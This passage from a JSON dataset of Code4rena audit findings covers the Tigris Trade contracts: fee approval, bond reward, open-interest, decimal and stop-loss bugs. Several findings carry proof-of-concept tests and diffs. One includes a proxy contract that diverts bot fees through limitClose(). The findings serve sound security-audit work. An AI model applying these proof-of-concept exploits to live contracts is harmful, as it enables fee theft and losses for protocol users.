      "summary": "\nThis bug report is about the lack of approval when calling the `Trading._handleOpenFees` function which leads to the Governance NFT holder not receiving the rewards from the DAO fees generated by the trade. The `Trading._handleOpenFees` function does not approve the `GovNFT` contract for spending any of the `Trading` contract's `_tigAsset` balance, unlike the `Trading._handleCloseFees` function which executes `IStable(_tigAsset).approve(address(gov), type(uint).max)`. This lack of approval means that when calling the `Trading._handleOpenFees` function without the `Trading._handleCloseFees` function being called beforehand, the `GovNFT.distribute` function's execution of `IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)` in the `try...catch...` block will not transfer any `_tigAsset` amount as the trade's DAO fees to the `GovNFT` contract.\n\nA Proof of Concept (POC) was provided to demonstrate the scenario. A test was suggested to be added in the `Signature verification` `describe` block in `test\\07.Trading.js` to pass and demonstrate the scenario. The suggested mitigation is to add `IStable(_tigAsset).approve(address(gov), type(uint).max);` in the `_handleOpenFees` function in line 749 of `contracts\\Trading.sol`. A comparison test was also suggested to be added in the `Signature verification` `describe` block in `test\\07.Trading.js` to demonstrate that the Governance NFT holder's pending rewards is no longer 0 after implementing the suggested mitigation.\n\nThe tools used for this bug report is VSCode.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/649",
      "tags": [],
      "finders": [
        "rbserver",
        "cccz",
        "bin2chen",
        "KingNFT",
        "HE1M",
        "stealthyz",
        "unforgiven"
      ]
    },
    {
      "id": "6352",
      "title": "[M-22] Unreleased locks cause the reward distribution to be flawed in BondNFT",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L150> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L225>\n\n### Impact\n\nAfter a lock has expired, it doesn't get any rewards distributed to it. But, unreleased locks cause other existing bonds to not receive the full amount of tokens either. The issue is that as long as the bond is not released, the `totalShares` value isn't updated. Everybody receives a smaller cut of the distribution. Thus, bond owners receive less rewards than they should.\n\nA bond can be released after it expired by the owner of it. If the owner doesn't release it for 7 days, anybody else can release it as well. As long as the owner doesn't release it, the issue will be in effect for at least 7 epochs.\n\nSince this causes a loss of funds for every bond holder I rate it as HIGH. It's likely to be an issue since you can't guarantee that bonds will be released the day they expire.\n\n### Proof of Concept\n\nHere's a test showcasing the issue:\n\n```js\n// 09.Bonds.js\n\n    it.only(\"test\", async function () {\n      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"100\"));\n      await lock.connect(owner).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 100);\n      await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"1000\"));\n      await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"1000\"), 10);\n      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"1000\"));\n      await bond.distribute(stabletoken.address, ethers.utils.parseEther(\"1000\"));\n\n      await network.provider.send(\"evm_increaseTime\", [864000]); // Skip 10 days\n      await network.provider.send(\"evm_mine\");\n\n      [,,,,,,,pending,,,] = await bond.idToBond(1);\n      expect(pending).to.be.equals(\"499999999999999999986\");\n      [,,,,,,,pending,,,] = await bond.idToBond(2);\n      expect(pending).to.be.equals(\"499999999999999999986\");\n\n\n      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"1000\"));\n      await bond.distribute(stabletoken.address, ethers.utils.parseEther(\"1000\"));\n\n      await network.provider.send(\"evm_increaseTime\", [86400 * 3]); // Skip 3 days\n      await network.provider.send(\"evm_mine\");\n\n      // Bond 2 expired, so it doesn't receive any of the new tokens that were distributed\n      [,,,,,,,pending,,,] = await bond.idToBond(2);\n      expect(pending).to.be.equals(\"499999999999999999986\");\n\n      // Thus, Bond 1 should get all the tokens, increasing its pending value to 1499999999999999999960\n      // But, because bond 2 wasn't released (`totalShares` wasn't updated), bond 1 receives less tokens than it should.\n      // Thus, the following check below fails\n      [,,,,,,,pending,,,] = await bond.idToBond(1);\n      expect(pending).to.be.equals(\"1499999999999999999960\");\n\n      await lock.connect(user).release(2);\n\n      expect(await stabletoken.balanceOf(user.address)).to.be.equals(\"1499999999999999999986\");\n\n    });\n```\n\nThe `totalShares` value is only updated after a lock is released:\n\n```sol\n    function release(\n        uint _id,\n        address _releaser\n    ) external onlyManager() returns(uint amount, uint lockAmount, address asset, address _owner) {\n        Bond memory bond = idToBond(_id);\n        require(bond.expired, \"!expire\");\n        if (_releaser != bond.owner) {\n            unchecked {\n                require(bond.expireEpoch + 7 < epoch[bond.asset], \"Bond owner priority\");\n            }\n        }\n        amount = bond.amount;\n        unchecked {\n            totalShares[bond.asset] -= bond.shares;\n        // ... \n```\n\n### Recommended Mitigation Steps\n\nOnly shares belonging to an active bond should be used for the distribution logic.\n\n**[TriHaz (Tigris Trade) disputed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1374438815):**\n > >Since this causes a loss of funds for every bond holder I rate it as HIGH. \n> \n> Funds are not lost, they will be redistributed when the bond is expired. \n> https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L180\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1399439420):**\n> I've asked the Warden for additional proof.  \n> \n>*(Note: See [original submission](https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1399439420) for proof.)*\n>\n> And believe that the finding is valid.\n> \n> I have adapted the test to also claim after, and believe that the lost rewards cannot be received back (see POC and different values we get back).\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1399439953):**\n > I have to agree with the Warden's warning, however, the `release` function is public, meaning anybody can break expired locks.\n> \n> For this reason, I believe that Medium Severity is more appropriate.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that exists in the BondNFT contract code. It is found in lines 150 and 225 of the code. The issue is that after a lock has expired, it does not receive any rewards and other existing bonds also do not receive the full amount of tokens due to the unreleased locks. This causes bond owners to receive less rewards than they should. This vulnerability is rated as HIGH since it can cause a loss of funds for every bond holder. \n\nThe vulnerability can be tested using the 09.Bonds.js code. The `totalShares` value is only updated after a lock is released. To mitigate this vulnerability, only shares belonging to an active bond should be used for the distribution logic.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/630",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "__141345__",
        "Ermaniwe",
        "Ruhum",
        "wait",
        "rvierdiiev"
      ]
    },
    {
      "id": "6351",
      "title": "[M-21] executeLimitOrder() modifies open-interest with a wrong position value",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L513-L517\n\n\n## Vulnerability details\n\n\nThe `PairsContract` registeres the total long/short position that's open for a pair of assets, whenever a new position is created the total grows accordingly.\nHowever at `executeLimitOrder()` the position size that's added is wrongly calculated - it uses margin before fees, while the actual position is created after subtracting fees.\n\n## Impact\nThe OpenInterest would register wrong values (11% diff in the case of PoC), which will distort the balance between long and short positions (the whole point of the OpenInterest is to balance them to be about equal).\n\n\n## Proof of Concept\nIn the following test, an order is created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created.\n\n\n```diff\ndiff --git a/test/07.Trading.js b/test/07.Trading.js\nindex ebe9948..dfb7f98 100644\n--- a/test/07.Trading.js\n+++ b/test/07.Trading.js\n@@ -778,7 +778,7 @@ describe(\"Trading\", function () {\n      */\n     it(\"Creating and executing limit buy order, should have correct price and bot fees\", async function () {\n       // Create limit order\n-      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n+      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"100\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n       await trading.connect(owner).initiateLimitOrder(TradeInfo, 1, parseEther(\"20000\"), PermitData, owner.address);\n       expect(await position.limitOrdersLength(0)).to.equal(1); // Limit order opened\n@@ -787,6 +787,9 @@ describe(\"Trading\", function () {\n       await network.provider.send(\"evm_increaseTime\", [10]);\n       await network.provider.send(\"evm_mine\");\n \n+      let count = await position.getCount();\n+      let id = count.toNumber() - 1;\n+\n       // Execute limit order\n       let PriceData = [node.address, 0, parseEther(\"10000\"), 10000000, 2000000000, false]; // 0.1% spread\n       let message = ethers.utils.keccak256(\n@@ -798,8 +801,22 @@ describe(\"Trading\", function () {\n       let sig = await node.signMessage(\n         Buffer.from(message.substring(2), 'hex')\n       );\n+      // trading.connect(owner).setFees(true,3e8,1e8,1e8,1e8,1e8);\n       \n-      await trading.connect(user).executeLimitOrder(1, PriceData, sig);\n+\n+      let oi = await pairscontract.idToOi(0, stabletoken.address);\n+      expect(oi.longOi.toNumber()).to.equal(0);\n+      console.log({oi, stable:stabletoken.address});\n+\n+      await trading.connect(user).executeLimitOrder(id, PriceData, sig);\n+      let trade = await position.trades(id);\n+      console.log(trade);\n+      oi = await pairscontract.idToOi(0, stabletoken.address);\n+      console.log(oi);\n+\n+      expect(oi.longOi.div(10n**18n).toNumber()).to.equal(trade.margin.mul(trade.leverage).div(10n**18n * 10n**18n).toNumber());\n+\n+\n       expect(await position.limitOrdersLength(0)).to.equal(0); // Limit order executed\n       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Creates open position\n       expect((await trading.openFees()).botFees).to.equal(2000000);\n@@ -807,6 +824,7 @@ describe(\"Trading\", function () {\n       let [,,,,price,,,,,,,] = await position.trades(1);\n       expect(price).to.equal(parseEther(\"20020\")); // Should have guaranteed execution price with spread\n     });\n+    return;\n     it(\"Creating and executing limit sell order, should have correct price and bot fees\", async function () {\n       // Create limit order\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, false, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n@@ -1606,6 +1624,7 @@ describe(\"Trading\", function () {\n       expect(await stabletoken.balanceOf(user.address)).to.equal(parseEther(\"1.5\"));\n     });\n   });\n+  return;\n   describe(\"Modifying functions\", function () {\n     it(\"Updating TP/SL on a limit order should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n\n```\n\nOutput:\n```\n1) Trading\n       Limit orders and liquidations\n         Creating and executing limit buy order, should have correct price and bot fees:\n\n      AssertionError: expected 100000 to equal 90000\n      + expected - actual\n\n      -100000\n      +90000\n```\n\n\n## Recommended Mitigation Steps\nCorrect the calculation to use margin after fees.",
      "summary": "\nA bug was found in the `PairsContract` code in the `executeLimitOrder()` function. This function is responsible for registering the total long/short position that's open for a pair of assets. The bug causes the position size that's added to be wrongly calculated, as it uses margin before fees, while the actual position is created after subtracting fees. \n\nThe impact of this bug is that the OpenInterest would register wrong values, resulting in a distorted balance between long and short positions. A proof of concept was provided in the report, which showed that an order created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created. \n\nThe recommended mitigation step for this bug is to correct the calculation to use margin after fees.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/576",
      "tags": [],
      "finders": [
        "KingNFT",
        "0xA5DF",
        "HollaDieWaldfee",
        "Jeiwan"
      ]
    },
    {
      "id": "6350",
      "title": "[M-20] Trading#initiateMarketOrder allows to open a position with more margin than expected due to _handleOpenFees wrong calculation when a trade is referred",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178-L179> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738>\n\nWhen `initiateMarketOrder` is called, `_marginAfterFees` are calculated and then used to calculate `_positionSize`:\n\n```solidity\nuint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n```\n\nThe problem is that `_handleOpenFees` does not consider referrer fees when it calculates its output (paidFees), leading to open a position greater than expected.\n\n### Impact\n\nFor a referred trade, `initiateMarketOrder` always opens a position greater than the one supposed, by allowing the use of more margin than the one expected.\n\n### Proof of Concept\n\nThe output of `_handleOpenFees` is `_feePaid`, which is calculated [once](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738), and it does not consider referralFees:\n\n```solidity\n// No refferal fees are considered\n_feePaid =\n    _positionSize\n    * (_fees.burnFees + _fees.botFees) // get total fee%\n    / DIVISION_CONSTANT // divide by 100%\n    + _daoFeesPaid;\n```\n\nThen we can notice that, if the output of `_handleOpenFees` did not consider referral fees, neither would `\\_marginAfterFees` do:\n\n```solidity\nuint256 _marginAfterFees =\n    _tradeInfo.margin-\n    _handleOpenFees(\n        _tradeInfo.asset,\n        _tradeInfo.margin*_tradeInfo.leverage/1e18, \n        _trader,\n        _tigAsset,\n        false);\n\n// @audit Then _positionSize would be greater than what is supposed to be, allowing to create a position greater than expected\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n```\n\n### Recommended Mitigation steps\n\nConsider referral fees when `_feePaid` is calculated in `_handleOpenFees`:\n\n```diff\n// In _handleOpenFees function\n+   uint256 _refFeesToConsider = _referrer == address(0) ? 0 : _fees.referralFees;\n    _feePaid =\n        _positionSize\n-       * (_fees.burnFees + _fees.botFees) // get total fee%\n+       * (_fees.burnFees + _fees.botFees + _refFeesToConsider) // get total fee%\n        / DIVISION_CONSTANT // divide by 100%\n        + _daoFeesPaid;\n```\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/542)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/542#issuecomment-1382265541):**\n > The warden has shown an accounting issue in how fees are calculated, the refactoring is straightforward.\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of a Trading contract on the Tigris platform. The vulnerability is related to the ```initiateMarketOrder``` function, which calculates the ```_marginAfterFees``` and then uses it to calculate ```_positionSize``` using the following code:\n\n```solidity\nuint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n```\n\nThe problem is that ```_handleOpenFees``` does not consider referrer fees when it calculates its output (paidFees), leading to open a position greater than expected. This means that for a referred trade, ```initiateMarketOrder``` always opens a position greater than the one supposed, by allowing to use more margin than the one expected.\n\nThe output of ```_handleOpenFees``` is ```_feePaid```, which is calculated once and it does not consider referralFees. This leads to ```_positionSize``` being greater than what is supposed to be, allowing to create a position greater than expected.\n\nTo mitigate this vulnerability, the code should consider referral fees when ```_feePaid``` is calculated in ```_handleOpenFees``` as follows:\n\n```solidity\n// In _handleOpenFees function\n+   uint256 _refFeesToConsider = _referrer == address(0) ? 0 : _fees.referralFees;\n    _feePaid =\n        _positionSize\n-       * (_fees.burnFees + _fees.botFees) // get total fee%\n+       * (_fees.burnFees + _fees.botFees + _refFeesToConsider) // get total fee%\n        / DIVISION_CONSTANT // divide by 100%\n        + _daoFeesPaid;\n```\n\nThis bug report highlights a vulnerability in the code of the Trading contract on the",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/542",
      "tags": [],
      "finders": [
        "koxuan",
        "carlitox477"
      ]
    },
    {
      "id": "6349",
      "title": "[M-19] _handleDeposit and _handleWithdraw do not account for tokens with decimals higher than 18",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L650\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675\n\n\n## Vulnerability details\n\n## Impact \n\nIn `Trading.sol` a [deposit](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675) or [withdrawal](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L700) of tokens with decimals higher than 18 will always revert. \n\nThis is the case e.g. for `NEAR` which is divisible into 10e24 `yocto` \n\n## Proof of Concept\n\nChange [00.Mocks.js#L33](https://github.com/code-423n4/2022-12-tigris/blob/main/deploy/test/00.Mocks.js#L33) to:\n\n```\nargs: [\"USDC\", \"USDC\", 24, deployer, ethers.utils.parseUnits(\"1000\", 24)]\n```\n\nThen in [07.Trading.js](https://github.com/code-423n4/2022-12-tigris/blob/main/test/07.Trading.js):\n\n```\nOpening and closing a position with tigUSD output\nOpening and closing a position with <18 decimal token output\n```\n\nare going to fail with:\n```\nError: VM Exception while processing transaction: reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)\n```\n\n## Tools Used\n\nVisual Studio Code\n\n## Recommended Mitigation Steps\n\nUpdate calculations in the contract to account for tokens with decimals higher than 18.",
      "summary": "\nThis bug report is about a vulnerability in the Trading.sol contract. This vulnerability can cause a deposit or withdrawal of tokens with decimals higher than 18 to always revert. This can be demonstrated by changing the 00.Mocks.js file and running the 07.Trading.js test. This will result in an error that says \"Arithmetic operation underflowed or overflowed outside of an unchecked block\". To fix this vulnerability, calculations in the contract should be updated to account for tokens with decimals higher than 18.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/533",
      "tags": [
        "Decimals"
      ],
      "finders": [
        "Avci",
        "Deivitto",
        "pwnforce",
        "rbserver",
        "0xDecorativePineapple",
        "Dinesh11G",
        "izhelyazkov",
        "Englave",
        "Tointer",
        "Critical",
        "0xdeadbeef0x",
        "ak1",
        "chaduke",
        "unforgiven",
        "rvierdiiev",
        "yjrwkk",
        "0x4non"
      ]
    },
    {
      "id": "6348",
      "title": "[M-18] StopLoss/TakeProfit should be validated again for the new price in Trading.executeLimitOrder()",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/b2ebb8ea1def4927a747e7a185174892506540ab/contracts/Trading.sol#L506\n\n\n## Vulnerability details\n\n## Impact\nThe open price of a stop order might be changed during execution but it doesn't validate StopLoss/TakeProfit for the changed price.\n\nAs a result, the executed market order might be closed immediately and there would be an unexpected loss for users.\n\n## Proof of Concept\nAs we can see from `executeLimitOrder()`, the open price might be changed to the current price for the stop order.\n\n```solidity\nFile: 2022-12-tigris\\contracts\\Trading.sol\n480:     function executeLimitOrder(\n481:         uint _id, \n482:         PriceData calldata _priceData,\n483:         bytes calldata _signature\n484:     ) \n485:         external\n486:     {\n487:         unchecked {\n488:             _checkDelay(_id, true);\n489:             tradingExtension._checkGas();\n490:             if (tradingExtension.paused()) revert TradingPaused();\n491:             require(block.timestamp >= limitDelay[_id]);\n492:             IPosition.Trade memory trade = position.trades(_id);\n493:             uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true);\n494:             (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0);\n495:             if (trade.orderType == 0) revert(\"5\");\n496:             if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet\n497:             if (trade.direction && trade.orderType == 1) {\n498:                 if (trade.price < _price) revert(\"6\"); //LimitNotMet\n499:             } else if (!trade.direction && trade.orderType == 1) {\n500:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet\n501:             } else if (!trade.direction && trade.orderType == 2) {\n502:                 if (trade.price < _price) revert(\"6\"); //LimitNotMet\n503:                 trade.price = _price;\n504:             } else {\n505:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet\n506:                 trade.price = _price; //@audit check sl/tp\n507:             } \n508:             if(trade.direction) {\n509:                 trade.price += trade.price * _spread / DIVISION_CONSTANT;\n510:             } else {\n511:                 trade.price -= trade.price * _spread / DIVISION_CONSTANT;\n512:             }\n\n```\n\nBut it doesn't validate sl/tp again for the new price so the order might have an invalid sl/tp.\n\nThe new price wouldn't satisfy the sl/tp requirements when the price was changed much from the original price due to the high slippage and the order might be closed immediately by sl or tp in this case.\n\nOriginally, the protocol validates stoploss only but I say to validate both of stoploss and takeprofit. (I submitted it as another issue to validate tp as well as sl).\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nRecommend validating sl/tp for the new `trade.price` in `Trading.executeLimitOrder()`.",
      "summary": "\nThis bug report is about a vulnerability in the code of the \"2022-12-tigris\" project on Github. The vulnerability is related to the open price of a stop order, which might be changed during execution without validating StopLoss/TakeProfit for the changed price. If the price is changed too much from the original price, the order might be closed immediately and result in unexpected losses for users.\n\nThe vulnerability was discovered through manual review of the code. It is recommended that the code be updated to validate sl/tp for the new \"trade.price\" in the \"Trading.executeLimitOrder()\" function. This will help ensure that the order is not closed unexpectedly due to high slippage.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/512",
      "tags": [],
      "finders": [
        "bin2chen",
        "hansfriese"
      ]
    },
    {
      "id": "6347",
      "title": "[M-17] User can close an order via limitClose(), and take bot fees to themselves",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L565-L576\n\n\n## Vulnerability details\n\n\n\n## Impact\nBot fees are used when a position is opened/closed via a bot. In that case a bot fee is subtracted from the dao fee and sent to the closing bot.\nA user can use that to to reduce the dao fees for closing an order and keep it to themselves.\nInstead of closing the order via `initiateClose()`, the user can use a proxy contract to update the stop-loss value and then `limitClose()` the order.\nSince that is done in one function call, no bot can run the `limitClose()` and the bot fee will go to the user.\n\n## Proof of Concept\n\nThe following PoC shows how a trade is closed by a proxy contract that sets the limit and closes it via `limitClose()`:\n\n```diff\ndiff --git a/test/07.Trading.js b/test/07.Trading.js\nindex ebe9948..e50b0cc 100644\n--- a/test/07.Trading.js\n+++ b/test/07.Trading.js\n@@ -17,6 +17,7 @@ describe(\"Trading\", function () {\n \n   let TradingExtension;\n   let tradingExtension;\n+  let myTrader;\n \n   let TradingLibrary;\n   let tradinglibrary;\n@@ -37,7 +38,7 @@ describe(\"Trading\", function () {\n \n   let MockDAI;\n   let MockUSDC;\n-  let mockusdc;\n+  let mockusdc, mockdai;\n \n   let badstablevault;\n \n@@ -55,6 +56,7 @@ describe(\"Trading\", function () {\n     const Position = await deployments.get(\"Position\");\n     position = await ethers.getContractAt(\"Position\", Position.address);\n     MockDAI = await deployments.get(\"MockDAI\");\n+    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n     MockUSDC = await deployments.get(\"MockUSDC\");\n     mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n     const PairsContract = await deployments.get(\"PairsContract\");\n@@ -84,6 +86,10 @@ describe(\"Trading\", function () {\n     TradingLibrary = await deployments.get(\"TradingLibrary\");\n     tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n     await trading.connect(owner).setLimitOrderPriceRange(1e10);\n+\n+\n+    let mtFactory = await ethers.getContractFactory(\"MyTrader\");\n+    myTrader = await mtFactory.deploy(Trading.address, Position.address);\n   });\n   describe(\"Check onlyOwner and onlyProtocol\", function () {\n     it(\"Set max win percent\", async function () {\n@@ -536,6 +542,31 @@ describe(\"Trading\", function () {\n       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Trade has opened\n       expect(await stabletoken.balanceOf(owner.address)).to.equal(parseEther(\"0\")); // Should no tigAsset left\n     });\n+\n+    it(\"Test my trader\", async function () {\n+      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n+      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n+      let message = ethers.utils.keccak256(\n+        ethers.utils.defaultAbiCoder.encode(\n+          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n+          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n+        )\n+      );\n+      let sig = await node.signMessage(\n+        Buffer.from(message.substring(2), 'hex')\n+      );\n+      \n+      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n+      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n+\n+\n+      await trading.connect(owner).approveProxy(myTrader.address, 1e10);\n+      await myTrader.connect(owner).closeTrade(1, PriceData, sig);\n+\n+\n+    });\n+  return;\n+\n     it(\"Closing over 100% should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n@@ -551,8 +582,10 @@ describe(\"Trading\", function () {\n       \n       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n+\n       await expect(trading.connect(owner).initiateCloseOrder(1, 1e10+1, PriceData, sig, StableVault.address, StableToken.address, owner.address)).to.be.revertedWith(\"BadClosePercent\");\n     });\n+    return;\n     it(\"Closing 0% should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n@@ -700,6 +733,7 @@ describe(\"Trading\", function () {\n       expect(margin).to.equal(parseEther(\"500\"));\n     });\n   });\n+  return;\n   describe(\"Trading using <18 decimal token\", async function () {\n     it(\"Opening and closing a position with tigUSD output\", async function () {\n       await pairscontract.connect(owner).setAssetBaseFundingRate(0, 0); // Funding rate messes with results because of time\n\n```\n\n`MyTrader.sol`:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {ITrading} from \"../interfaces/ITrading.sol\";\nimport \"../utils/TradingLibrary.sol\";\nimport \"../interfaces/IPosition.sol\";\nimport {ERC20} from \"@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\";\n\n\n\n\ncontract MyTrader{\n\n    ITrading trading;\n    IPosition position;\n\n    receive() payable external{\n\n    }\n\n    constructor(address _trading, address _position){\n        trading = ITrading(_trading);\n        position = IPosition(_position);\n    }\n\n    function closeTrade(\n        uint _id,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) public{\n        bool _tp = false;\n        \n        trading.updateTpSl(_tp, _id, _priceData.price, _priceData, _signature, msg.sender);\n        trading.limitClose(_id, _tp, _priceData, _signature);\n\n        \n    }\n\n}\n```\n\n## Recommended Mitigation Steps\nDon't allow updating sl or tp and",
      "summary": "\nA bug was recently reported in the Trading.sol contract, which is part of the code-423n4/2022-12-tigris repository on GitHub. This bug allows users to reduce the dao fees for closing an order and keep it to themselves. The bug is triggered when a user uses a proxy contract to update the stop-loss value and then limitClose() the order. This is done in one function call, which prevents bots from running the limitClose() and the bot fee being sent to the user. \n\nA proof of concept was provided, which showed how a trade is closed by a proxy contract that sets the limit and closes it via limitClose(). An additional contract, MyTrader.sol, was also provided. \n\nThe recommended mitigation steps are to not allow updating the stop-loss or take-profit values, as this is how the bug is triggered.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/468",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "6346",
      "title": "[M-16] distribute() wont update epoch[tigAsset] when totalShares[tigAsset]==0 which can cause later created bond for this tigAsset to have wrong mint epoch",
      "impact": "MEDIUM",
